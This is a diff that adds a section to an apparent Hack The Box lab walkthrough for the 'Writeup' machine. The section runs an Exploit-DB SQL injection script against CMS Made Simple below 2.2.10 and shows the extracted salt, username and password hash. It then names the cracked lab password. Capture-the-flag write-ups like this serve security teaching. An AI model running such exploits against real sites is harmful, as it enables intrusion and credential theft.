@@ -34,3 +34,19 @@ If you take a look at the web page source code then you should see that the webs
 
 <center><img src="/htb/writeup/cms.png"></center>
 <br>
+Using <b>Searchsploit</b> we can find a vulnerability that works for us. I chose this one because it was the most recent one.
+```
+CMS Made Simple < 2.2.10 - SQL Injection                                                                              | exploits/php/webapps/46635.py
+```
+I download the exploit from the exploit database *[here](https://www.exploit-db.com/exploits/46635)*. Then I execute the script and wait until it finishes. Eventually we see some credentials.
+```
+# python CSM_SQL_Injection.py -u http://10.10.10.138/writeup
+[+] Salt for password found: 5a599ef579066807
+[+] Username found: jkr
+[+] Email found: jkr@writeup.htb
+[+] Password found: 62def4866937f08cc13bab43bb14e6f7
+```
+So now we have a password hash and a salt. We can crack this by using and online password cracker. I used *[this](https://www.md5online.org/md5-decrypt.html)* one. After removing the salt, we get a passwor dof <b>raykayjay9</b>.
+
+<center><img src="/htb/writeup/decrypt.png"></center>
+</br>
